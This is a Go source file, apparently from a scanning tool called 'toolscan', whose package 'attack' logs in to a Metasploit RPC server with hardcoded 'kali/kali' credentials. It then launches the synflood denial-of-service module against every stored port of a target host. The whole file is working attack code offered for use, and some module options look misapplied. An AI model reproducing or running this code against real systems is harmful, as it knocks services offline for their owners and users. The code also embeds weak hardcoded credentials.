package attack

import (
	"fmt"
	"toolscan/core/model"
	"toolscan/core/utils"

	"github.com/hupe1980/gomsf"
	"github.com/jinzhu/gorm"
)

func MetasploitAttack(kind string, target string) {
	switch kind {
	case "ddos":
		DDOSAll(utils.Config.DB, target)
	default:
		utils.Config.Log.LogInfo("Can't perform attack")
		return
	}
}

func DDOSAll(db *gorm.DB, target string) {
	// get port
	host := model.GetHostByAddress(db, target)
	ports := host.Ports

	// init RPC clinet to communicate with metasploit
	// msfrpcd -U kali -P kali
	client, err := gomsf.New("0.0.0.0:55553")
	if err != nil {
		panic(err)
	}
	if err := client.Login("kali", "kali"); err != nil {
		panic(err)
	}
	defer client.Logout()

	for _, port := range ports {
		DDOSSingle(target, port.Number, client)
	}
}

func DDOSSingle(target string, port int, client *gomsf.Client) {
	executeResult, err := client.Module.Execute(gomsf.ExploitType, "auxiliary/dos/tcp/synflood", map[string]interface{}{
		"LHOST": target,
		"LPORT": port,
	})
	if err != nil {
		panic(err)
	}
	fmt.Printf("JobID: %d\n", executeResult.JobID)
	fmt.Printf("UUID: %s\n", executeResult.UUID)
}
